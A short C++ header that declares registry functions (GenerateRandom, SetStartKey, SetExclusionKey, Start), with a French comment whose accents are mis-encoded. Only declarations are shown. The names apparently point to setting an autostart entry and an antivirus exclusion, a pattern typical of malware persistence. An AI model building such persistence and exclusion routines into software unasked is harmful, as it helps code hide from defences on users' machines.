#pragma once
#include "settings.h"

// D�clarations des fonctions li�es au registre
std::wstring GenerateRandom(int length);
void SetStartKey(const std::wstring& registryKey, const std::wstring& value);
void SetExclusionKey(const wchar_t* value);
void Start(void);